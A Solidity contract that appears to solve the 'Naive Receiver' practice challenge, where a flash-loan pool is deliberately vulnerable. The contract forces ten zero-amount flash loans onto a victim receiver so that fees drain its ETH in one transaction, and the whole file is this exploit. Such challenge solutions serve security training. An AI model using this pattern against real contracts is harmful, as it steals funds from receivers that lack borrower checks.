// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttack {
    INaiveReceiverLenderPool private pool;
    address private receiver;

    constructor(address _pool, address _receiver) {
        pool = INaiveReceiverLenderPool(_pool);
        receiver = _receiver;
    }

    /** Drain all ETH in a single transaction */
    function attack() external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 0);
        }
    }
}
